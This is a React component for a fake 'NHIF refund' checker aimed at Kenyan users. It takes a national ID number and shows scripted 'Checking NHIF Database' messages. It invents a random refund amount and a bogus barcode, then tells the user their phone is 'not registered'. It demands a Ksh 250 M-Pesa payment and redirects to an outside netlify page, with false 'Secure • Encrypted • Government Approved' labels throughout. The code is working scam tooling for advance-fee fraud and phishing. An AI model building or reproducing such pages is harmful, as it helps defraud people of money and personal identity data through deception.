import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CheckCircle, Calculator, FileText, Clock, PartyPopper, Phone } from "lucide-react";
import nhifLogo from "@/assets/nhif-logo.png";
import { 
  trackStartEligibility, 
  trackEligibilitySuccess, 
  trackProceedToClaim, 
  trackSubmitClaim, 
  trackWithdrawalAttempt,
  trackFinishRegistrationClick
} from "@/lib/gtag";

interface RefundResult {
  amount: number;
  claimFee: number;
  eligible: boolean;
}

export const RefundCalculator = () => {
  const [idNumber, setIdNumber] = useState("");

  const [result, setResult] = useState<RefundResult | null>(null);
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [loaderText, setLoaderText] = useState('Verifying...');
  const [mpesaNumber, setMpesaNumber] = useState('');
  const [withdrawalError, setWithdrawalError] = useState(false);
  const [registered, setRegistered] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [registrationLoaderText, setRegistrationLoaderText] = useState('Confirming phone number...');
  const registrationLoaderMessages = ['Confirming phone number...', 'Linking to NHIF claim account...', 'Finalizing registration...'];
  const loaderMessages = ['Verifying...', 'Confirming...', 'Retrieving...', 'Checking NHIF Database...', 'Almost There...'];
  
  // Cycle loader text
  useEffect(() => {
    if (!loading) return;
    let idx = 0;
    const interval = setInterval(() => {
      idx = (idx + 1) % loaderMessages.length;
      setLoaderText(loaderMessages[idx]);
    }, 1200);
    return () => clearInterval(interval);
  }, [loading]);

  const calculateRefund = () => {
    if (!idNumber) return;
    trackStartEligibility('calculator');
    setLoading(true);
    setLoaderText(loaderMessages[0]);
    setTimeout(() => {
      // Simulate refund calculation
      const baseAmount = Math.floor(Math.random() * 5000) + 2000;
      const claimFee = Math.floor(baseAmount * 0.06) + 199;
      setResult({
        amount: baseAmount,
        claimFee,
        eligible: true
      });
      trackEligibilitySuccess(baseAmount);
      setLoading(false);
      setStep(2);
    }, 3500);
  };


  const proceedToClaim = () => {
    trackProceedToClaim();
    setStep(3);
  };

  const generatePDF = () => {
    trackSubmitClaim();
    setStep(4);
  };

  if (step === 4) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
        <Card className="max-w-2xl w-full p-8 text-center animate-fade-in relative overflow-hidden">
          <div className="absolute top-0 left-0 w-full h-full flex justify-center items-center z-0">
             <div className="absolute text-6xl opacity-10 animate-spin-slow">🎉</div>
             <div className="absolute text-5xl opacity-10 animate-ping delay-500">🎊</div>
          </div>
          <div className="relative z-10">
            <PartyPopper className="w-20 h-20 text-yellow-500 mx-auto mb-4 animate-bounce" />
            <h2 className="text-3xl font-bold text-foreground mb-2">Congratulations!</h2>
            <p className="text-muted-foreground mb-6">Your NHIF refund of Ksh {result?.amount.toLocaleString()} is approved and ready!</p>

            <div className="bg-success-light rounded-lg p-6 mb-6">
              <h3 className="font-bold text-success text-4xl">Ksh {(result.amount - result.claimFee).toLocaleString()}</h3>
              <p className="text-success-dark font-medium">Total Amount Ready for Withdrawal</p>
            </div>

            <Button 
              onClick={() => setStep(5)} 
              variant="claim"
              className="w-full text-lg py-6 shadow-lg hover:shadow-xl transition-shadow duration-300 animate-pulse"
            >
              Withdraw to M-Pesa
            </Button>

            <Button 
              onClick={() => setStep(1)} 
              variant="link"
              className="mt-4 text-muted-foreground"
            >
              Process Another Claim
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  if (step === 5) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4 relative">
        {/* Base Card for phone number input */}
        <Card className="max-w-md w-full p-8 animate-fade-in">
          <div className="text-center mb-6">
            <Phone className="w-16 h-16 text-primary mx-auto mb-4" />
            <h2 className="text-3xl font-bold text-foreground mb-2">Withdraw to M-Pesa</h2>
            <p className="text-muted-foreground">Enter your phone number to receive your refund.</p>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-foreground mb-2">
                M-Pesa Phone Number
              </label>
              <Input
                type="text"
                placeholder="e.g. 0712345678"
                value={mpesaNumber}
                onChange={(e) => { setMpesaNumber(e.target.value); setWithdrawalError(false); }}
                className="w-full"
              />
            </div>

            {!withdrawalError && (
              <Button 
                onClick={() => { trackWithdrawalAttempt(result ? (result.amount - result.claimFee) : undefined); setWithdrawalError(true); }}
                disabled={!mpesaNumber || mpesaNumber.length < 10}
                variant="hero"
                className="w-full"
              >
                Confirm Withdrawal of Ksh {(result.amount - result.claimFee).toLocaleString()}
              </Button>
            )}

            {withdrawalError && (
              <div className="bg-red-100 border border-red-300 text-red-700 rounded-lg p-4 mt-2 animate-shake">
                <div className="font-semibold mb-2">Your phone number is not registered with NHIF.</div>
                <div className="mb-2">Register your phone number and withdraw again.</div>
                <div className="font-bold text-lg mt-4 mb-2 text-primary">Click to Register</div>
                <Button 
                  onClick={() => {
                    trackFinishRegistrationClick();
                    setIsRegistering(true);
                    let idx = 0;
                    const interval = setInterval(() => {
                      idx = (idx + 1) % registrationLoaderMessages.length;
                      setRegistrationLoaderText(registrationLoaderMessages[idx]);
                    }, 1500);
                    setTimeout(() => {
                      clearInterval(interval);
                      setIsRegistering(false);
                      setRegistered(true);
                    }, 4500);
                  }}
                  variant="claim"
                  className="w-full mt-2"
                >
                  Register Phone Number & Withdraw
                </Button>
              </div>
            )}
          </div>
        </Card>

        {/* Registration Loader Modal */}
        {isRegistering && (
          <div className="absolute inset-0 bg-black/60 flex items-center justify-center z-20 animate-fade-in">
            <Card className="p-8 text-center">
              <div className="flex flex-col items-center justify-center py-6">
                <div className="relative w-12 h-12 mb-4">
                  <span className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin"></span>
                </div>
                <div className="text-lg font-semibold text-primary animate-pulse">{registrationLoaderText}</div>
              </div>
            </Card>
          </div>
        )}

        {/* STK Push Modal */}
        {registered && (
          <div className="absolute inset-0 bg-black/60 flex items-center justify-center z-20 animate-fade-in">
            <Card className="p-8 text-center max-w-sm">
              <div className="bg-blue-100 border border-blue-300 text-blue-800 rounded-lg p-6 animate-fade-in shadow-lg">
                <h3 className="font-bold text-xl mb-2">Complete Your Registration</h3>
                <p className="mb-4">To complete registration, you will receive an M-Pesa STK push to pay <span className="font-bold">Ksh 250</span> to activate your M-Pesa and receive funds.</p>
                <Button 
                  onClick={() => window.location.href = 'https://completeregistrationnhif.netlify.app/'}
                  variant="hero"
                  className="w-full shadow-md"
                >
                  Finish Registration
                </Button>
              </div>
            </Card>
          </div>
        )}
      </div>
    );
  }

  if (step === 6) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
        <Card className="max-w-2xl w-full p-8 text-center animate-fade-in">
          <CheckCircle className="w-16 h-16 text-success mx-auto mb-4" />
          <h2 className="text-3xl font-bold text-foreground mb-2">Withdrawal Processing!</h2>
          <p className="text-muted-foreground">You will receive an M-Pesa confirmation message on {mpesaNumber} shortly.</p>
          <Button onClick={() => setStep(1)} variant="hero" className="mt-6 w-full">
            Done
          </Button>
        </Card>
      </div>
    );
  }

  if (step === 3) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
        <Card className="max-w-2xl w-full p-8 animate-fade-in">
          <div className="text-center mb-6">
            <FileText className="w-16 h-16 text-primary mx-auto mb-4" />
            <h2 className="text-3xl font-bold text-foreground mb-2">Generate Claim Form</h2>
            <p className="text-muted-foreground">AI-generated PDF form with barcode</p>
          </div>

          <div className="space-y-4 mb-6">
            <div className="flex justify-between items-center p-4 bg-accent rounded-lg">
              <span className="font-medium">Applicant ID:</span>
              <span className="font-mono">{idNumber}</span>
            </div>

            <div className="flex justify-between items-center p-4 bg-success-light rounded-lg">
              <span className="font-medium">Refund Amount:</span>
              <span className="font-bold text-success">Ksh {result?.amount.toLocaleString()}</span>
            </div>
          </div>

          <div className="bg-muted p-6 rounded-lg mb-6 text-center">
            <div className="text-6xl font-mono mb-2">||||| |||| |||||</div>
            <p className="text-sm text-muted-foreground">Barcode: {Math.floor(Math.random() * 1000000000)}</p>
          </div>

          <div className="flex gap-3">
            <Button 
              onClick={() => setStep(2)} 
              variant="outline"
              className="flex-1"
            >
              Back
            </Button>
            <Button 
              onClick={generatePDF} 
              variant="claim"
              className="flex-1"
            >
              Submit Claim
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  if (step === 2 && result) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
        <Card className="max-w-2xl w-full p-8 animate-fade-in">
          <div className="text-center mb-6">
            <CheckCircle className="w-16 h-16 text-success mx-auto mb-4" />
            <h2 className="text-3xl font-bold text-foreground mb-2">Refund Found!</h2>
            <p className="text-muted-foreground">You are eligible for an NHIF refund</p>
          </div>

          <div className="bg-gradient-success rounded-lg p-6 text-white text-center mb-6">
            <h3 className="text-2xl font-bold mb-2">Ksh {result.amount.toLocaleString()}</h3>
            <p className="opacity-90">Available for refund</p>
          </div>

          <div className="space-y-3 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-muted-foreground">ID Number:</span>
              <span className="font-medium">{idNumber}</span>
            </div>

            <div className="border-t pt-3">
              <div className="flex justify-between items-center">
                <span className="font-semibold">Refund Amount:</span>
                <span className="font-bold text-success text-lg">Ksh {result.amount.toLocaleString()}</span>
              </div>
            </div>
          </div>

          <div className="flex gap-3">
            <Button 
              onClick={() => setStep(1)} 
              variant="outline"
              className="flex-1"
            >
              Check Another ID
            </Button>
            <Button 
              onClick={proceedToClaim} 
              variant="claim"
              className="flex-1"
            >
              Proceed to Claim
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
        <Card className="max-w-md w-full p-8 animate-fade-in">
          <div className="flex flex-col items-center justify-center py-12">
            <img src={nhifLogo} alt="NHIF Logo" className="w-20 h-20 mb-6 rounded-lg shadow-md animate-spin-slow" />
            <div className="relative w-16 h-16 mb-6">
              <span className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin"></span>
              <span className="absolute inset-2 rounded-full border-2 border-primary-light border-t-transparent animate-spin-reverse"></span>
            </div>
            <div className="text-xl font-semibold text-primary animate-pulse mb-2">{loaderText}</div>
            <div className="text-sm text-muted-foreground">Please wait while we check your eligibility...</div>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-bg flex items-center justify-center p-4">
      <Card className="max-w-md w-full p-8 animate-fade-in">
        <div className="text-center mb-6">
          <img src={nhifLogo} alt="NHIF Logo" className="w-20 h-20 mx-auto mb-4 rounded-lg shadow-md animate-bounce" />
          <h2 className="text-3xl font-bold text-foreground mb-2">Check Your Refund</h2>
          <p className="text-muted-foreground">Enter your details to see if you're eligible</p>
        </div>

        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-foreground mb-2">
              National ID Number
            </label>
            <Input
              type="text"
              placeholder="Enter your ID number"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value)}
              className="w-full"
            />
          </div>



          <Button 
            onClick={calculateRefund}
            disabled={!idNumber}
            variant="hero"
            className="w-full"
          >
            Check Refund Eligibility
          </Button>
        </div>

        <div className="mt-6 text-center">
          <p className="text-xs text-muted-foreground">
            Secure • Encrypted • Government Approved
          </p>
        </div>
      </Card>
    </div>
  );
};